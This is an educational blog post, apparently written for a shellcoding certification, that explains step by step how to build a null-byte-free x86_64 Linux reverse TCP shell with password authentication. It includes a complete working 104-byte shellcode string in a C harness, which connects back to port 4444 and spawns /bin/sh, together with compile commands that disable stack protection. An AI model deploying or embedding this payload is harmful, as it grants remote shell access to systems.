<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:1.1rem}</style><title>x86_64 reverse TCP bind shell with basic authentication on Linux systems</title><meta name=description content="The objective here is to create a reverse TCP bind shell using assembly x64, which will authenticate the attacker through a password, and have no Null bytes …"><meta name=keywords content='blog,gokarna,hugo'><meta property="og:url" content="https://0x4ndr3.github.io/posts/x86_64-reverse-tcp-bind-shell-with-basic-authentication-on-linux-systems/"><meta property="og:type" content="website"><meta property="og:title" content="x86_64 reverse TCP bind shell with basic authentication on Linux systems"><meta property="og:description" content="The objective here is to create a reverse TCP bind shell using assembly x64, which will authenticate the attacker through a password, and have no Null bytes …"><meta property="og:image" content="https://0x4ndr3.github.io/pic.png"><meta property="og:image:secure_url" content="https://0x4ndr3.github.io/pic.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="x86_64 reverse TCP bind shell with basic authentication on Linux systems"><meta name=twitter:description content="The objective here is to create a reverse TCP bind shell using assembly x64, which will authenticate the attacker through a password, and have no Null bytes …"><meta property="twitter:domain" content="https://0x4ndr3.github.io/posts/x86_64-reverse-tcp-bind-shell-with-basic-authentication-on-linux-systems/"><meta property="twitter:url" content="https://0x4ndr3.github.io/posts/x86_64-reverse-tcp-bind-shell-with-basic-authentication-on-linux-systems/"><meta name=twitter:image content="https://0x4ndr3.github.io/pic.png"><link rel=canonical href=https://0x4ndr3.github.io/posts/x86_64-reverse-tcp-bind-shell-with-basic-authentication-on-linux-systems/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.fdbfba1e074acb7e4abbf4c94eb19abb7702489c9689a27ee5e24a2bd481e4b7.js integrity="sha256-/b+6HgdKy35Ku/TJTrGau3cCSJyWiaJ+5eJKK9SB5Lc="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://0x4ndr3.github.io/><img src=https://0x4ndr3.github.io/pic.png alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://0x4ndr3.github.io/>0x4ndr3</a></div><div class=nav-links><div class=nav-link><a href=https://0x4ndr3.github.io/posts/ aria-label><img class=svg-inject src=/icons/notepadplusplus.svg> Posts</a></div><div class=nav-link><a href=https://github.com/0x4ndr3 aria-label=github target=_blank><img class=svg-inject src=/icons/github.svg> Github</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://0x4ndr3.github.io/posts/><img class=svg-inject src=/icons/notepadplusplus.svg> Posts</a></li><li class=nav-item><a href=https://github.com/0x4ndr3 target=_blank><img class=svg-inject src=/icons/github.svg> Github</a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>x86_64 reverse TCP bind shell with basic authentication on Linux systems</h1><small role=doc-subtitle></small><p class=post-date>November 13, 2017</p><ul class=post-tags></ul></div><div class=post-content><p>The objective here is to create a reverse TCP bind shell using assembly x64, which will authenticate the attacker through a password, and have no Null bytes (0x00) in it.</p><p>So, where to start? Much like the <a href=https://0x4ndr3.github.io/posts/x86_64-tcp-bind-shellcode-with-basic-authentication-on-linux-systems/ target=_blank rel="nofollow noopener noreferrer"><span>previous post
</span></a>, by basing our code on the C equivalent source code. <a href=https://gitlab.com/0x4ndr3/SLAE64_Assignments/blob/master/Assignment_02/original%20basic%20reverse%20shell/Reverse-Shell.c target=_blank rel="nofollow noopener noreferrer"><span>Here is
</span></a>what a reverse tcp shell looks like in C:</p><p><a href=https://gitlab.com/0x4ndr3/SLAE64_Assignments/blob/master/Assignment_02/original%20basic%20reverse%20shell/Reverse-Shell.c target=_blank rel="nofollow noopener noreferrer"><span><img src=images/fig19.png alt="Figure 1 – reverse shell in C"></span></a></p><p>I will try not to repeat myself on this post, since I’ve layed out the basic rules, and the reasoning behind not having error checks on the <a href=https://0x4ndr3.github.io/posts/x86_64-tcp-bind-shellcode-with-basic-authentication-on-linux-systems/ target=_blank rel="nofollow noopener noreferrer"><span>TCP bind shell explanation
</span></a>.</p><p>One of the differences on this post, from the previous bind shell, is that <strong>I realised yet another improvement one can make on your shellcode</strong>. This actually reduced a previous draft of this shellcode from 110 bytes to 104 (oh, the smile on my face). Bare in mind that this has been a learning process and, even though I could rewrite the previous post’s bind shell to make it smaller, I decided to be honest about the learning itself, and leave it as it is.</p><p>Notice that the way I’ve been learning about techniques, to reduce shellcode byte size, is by going through as many as I can (mostly the shortests I can find) while consulting <a href=https://software.intel.com/sites/default/files/managed/39/c5/325462-sdm-vol-1-2abcd-3abcd.pdf target=_blank rel="nofollow noopener noreferrer"><span>Intel’s manual
</span></a>to understand what some rarely seen instructions do and check on their byte size (if I’m not compiling and objdump’ing them to be sure). And, while I have seen some very very short shellcode, I’ve noticed that to do so, sometimes, they sacrifice on their being robust, which is something I’m not willing to do.</p><p>Now, the improvement I’ve mentioned is that many shellcodes were doing the following:</p><blockquote><p>push rsp</p><p>pop rdi</p></blockquote><p>instead of:</p><blockquote><p>mov rdi, rsp</p></blockquote><p>This was confusing to me, because I was used to think, at this point, that the push was 2 bytes long, the pop was 1, and those are the same 3 bytes of length that the mov has. BUT the push is actually 2 bytes long only when you’re pushing an immediate value (like <em>push 10</em>). If you’re pushing a register it’s only one byte. Fantastic! I immediately recalled several instances where I was doing this “mov r64,r64” (a lot on the execve section for sure), which means I can save another byte for every single such instruction.</p><p>You should realise, by the end of analysing my final code, that I don’t always use the shortest options when it comes to these byte size reduction techniques. This is because of robustness. For example, I won’t use a 2 byte long “mov al,41” for a socket syscall, if I’m not absolutely positive that the 7 upper bytes from RAX register are zeros. “push 41” and “pop rax” guarantees just that, which means there are some places where I’ll definitely use the longer option. Specifically, after syscalls that will “pollute” those upper bytes on RAX because of their return value.</p><p>So let’s start by creating the socket [Figure 1 – line 23].</p><p>Again, I won’t explain how to make a syscall, where to get the syscall RAX register values, and how to know which constant value to use when you see AF_INET and SOCK_STREAM on the C code, since I <a href=https://0x4ndr3.github.io/posts/x86_64-tcp-bind-shellcode-with-basic-authentication-on-linux-systems/ target=_blank rel="nofollow noopener noreferrer"><span>already did
</span></a>.</p><p>So, the socket creation is pretty much the same as the TCP bind shell and comes down to:</p><p><a href=https://gitlab.com/0x4ndr3/SLAE64_Assignments/blob/master/Assignment_01/BindShell.nasm target=_blank rel="nofollow noopener noreferrer"><span><img src=images/fig92.png alt="Figure 2 – socket syscall"></span></a></p><p>Now we need to build up the socket structure with the information on the IP and TCP port to connect back to, and perform the connect itself:</p><p><img src=images/fig31.png alt="Figure 3 – socket structure and connect syscall"></p><p>The RAX register contains the socket returned by the <em>socket</em> syscall and, because we want to send it as the first parameter to the <em>bind</em> syscall, we start by moving it to RDI.</p><p>Now, regarding the apparently random value that I move into RBX, this is how I came to it:</p><ol><li><p>I compiled the code using an easy to read (and successfully tested) set of instructions (no care at all about null bytes), which will have as IP, the value 127.0.0.1 (localhost), and as the TCP port, the value 4444, which is 0x115c in hex and, because of the architecture being little endian, it actually becomes 0x5c11 (byte order reversal). The IP address is also reversed:</p><p><img src=images/fig41.png alt="Figure 4"></p></li><li><p>I used GDB, and break pointed into the instruction right next to the last one (sub rsp,8), and checked how the stack (RSP) was set. The structure is exactly 16 bytes long. Now the point of this exercise is to basically replace all the figure 4’s instructions for 2 push instructions, and that’s why I’m checking on its layout:</p><p><img src="images/fig111.png?w=616" alt="Figure 5 – stack layout"></p></li><li><p>Then, after push’ing the zeroed out RDX (the top eight zeros – “top” in terms of addressing, but actually on the bottom of fig 5), I took on the value that is layed out: 02 00 11 5c 7f 00 00 01; reversed it (little endian): 01 00 00 7f 5c 11 00 02; and, because of all the null bytes that this would have if I just moved it into a register, I had to flip every single bit into: fe ff ff 80 a3 ee ff fd Notice that I can only do this because there were no 0xff bytes in there, otherwise I’d still end up with a null byte on this one.</p></li><li><p>Execute the instruction <em>not rbx</em> , after moving the previous value into RBX, to reverse the bit flipping.</p></li></ol><p>And now we move on to redirecting the local application’s <em>stdin</em> and <em>stdout</em> file descriptors into the socket associated with the IP and port we just connected to:</p><p><img src=images/fig122.png alt="Figure 6"></p><p>This code has also been explained in the <a href=https://0x4ndr3.github.io/posts/x86_64-tcp-bind-shellcode-with-basic-authentication-on-linux-systems/ target=_blank rel="nofollow noopener noreferrer"><span>TCP bind shell post
</span></a>.</p><p>Now, the authentication code.</p><p><img src=images/fig71.png alt="Figure 7 – authentication section"></p><p>The only change here from the TCP bind shell is the improvement I mentioned of replacing the <em>mov r64,r64</em> to a <em>push r64</em> and <em>pop r64</em>. This same improvement was made on the <em>execve</em> syscall itself:</p><p><img src=images/fig81.png alt="Figure 8 – execve code"></p><p>And it’s done!</p><p>We now compile the code:</p><blockquote><p>nasm -f elf64 RevShell.nasm -o RevShell.o && ld RevShell.o -o RevShell</p></blockquote><p>To try the shellcode, we extract the opcode in hexadecimal format using some command line nijutsu:</p><blockquote><p>for i in <code>objdump -d RevShell | tr ‘\t’ ‘ ‘ | tr ‘ ‘ ‘\n’ | egrep ‘^[0-9a-f]{2}$’ </code>; do echo -n “\x$i” ; done</p></blockquote><p>The output will be placed inside the following array in C code:</p><blockquote><p>#include&lt;stdio.h><br>#include&lt;string.h><br>unsigned char code[] = \<br>“\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x99\x0f\x05\x48\x97\x52\x48\xbb\xfd\xff\xee\xa3\x80\xff\xff\xfe\x48\xf7\xd3\x53\x54\x5e\xb0\x2a\xb2\x10\x0f\x05\x6a\x03\x5e\xb0\x21\xff\xce\x0f\x05\xe0\xf8\x48\x31\xff\x50\x54\x5e\xb2\x08\x0f\x05\x48\x91\x48\xbb\x31\x32\x33\x34\x35\x36\x37\x0a\x53\x54\x5f\xf3\xa6\x75\x1a\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x54\x5a\x57\x54\x5e\x0f\x05\x90”;<br>main()<br>{<br>printf(“Shellcode Length:  %d\n”, (int)strlen(code));<br>int (*ret)() = (int(*)())code;<br>ret();<br>}</p></blockquote><p>Which will then be compiled with:</p><blockquote><p>gcc -fno-stack-protector -z execstack shellcode.c -o shellcode</p></blockquote><p>And execute it:</p><p><img src=images/fig93.png alt="Figure 9 – shellcode execution (104 bytes long)"></p><p><img src=images/fig1011.png alt="Figure 10 – Attacker listening to port 4444 and getting the connection from the shellcode"></p><p>You can find <a href=https://gitlab.com/0x4ndr3/SLAE64_Assignments target=_blank rel="nofollow noopener noreferrer"><span>all the files on my gitlab account
</span></a>.</p><p>On a personal note, just want to give a huge thanks to <a href=https://twitter.com/securitytube target=_blank rel="nofollow noopener noreferrer"><span>Vivek Ramachandran
</span></a>and the <a href=http://www.pentesteracademy.com/topics target=_blank rel="nofollow noopener noreferrer"><span>Pentester Academy
</span></a>team, as I have enjoyed every second of this course since I’ve learned so many interesting things. Thank you!</p><hr><p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:</p><ul><li>Current URL: <a href=https://my.ine.com/CyberSecurity/courses/42f93b0f/x86_64-assembly-language-and-shellcoding-on-linux target=_blank rel="nofollow noopener noreferrer"><span>https://my.ine.com/CyberSecurity/courses/42f93b0f/x86_64-assembly-language-and-shellcoding-on-linux</span></a></li><li>Original URL (does not work anymore): <a href=http://www.securitytube-training.com/online-courses/x8664-assembly-and-shellcoding-on-linux/index.html target=_blank rel="nofollow noopener noreferrer"><span>http://www.securitytube-training.com/online-courses/x8664-assembly-and-shellcoding-on-linux/index.html</span></a></li></ul><p><strong>Student ID: PA-2109</strong></p></div><div class=prev-next></div><svg id="btt-button" class="arrow-logo" height="1em" viewBox="0 0 384 512" onclick="scrollToTop()" title="Go to top"><path d="M177 159.7l136 136c9.4 9.4 9.4 24.6.0 33.9l-22.6 22.6c-9.4 9.4-24.6 9.4-33.9.0L160 255.9l-96.4 96.4c-9.4 9.4-24.6 9.4-33.9.0L7 329.7c-9.4-9.4-9.4-24.6.0-33.9l136-136c9.4-9.5 24.6-9.5 34-.1z"/></svg>
<script>let backToTopButton=document.getElementById("btt-button");window.onscroll=function(){scrollFunction()};function scrollFunction(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"}function scrollToTop(){window.scrollTo(0,0)}</script></div></main><footer class=footer><span>&copy; 2017 Andre Lima</span>
<span>Made with &#10084;&#65039; using <a target=_blank href=https://github.com/gokarna-theme/gokarna-hugo>Gokarna</a></span></footer></body></html>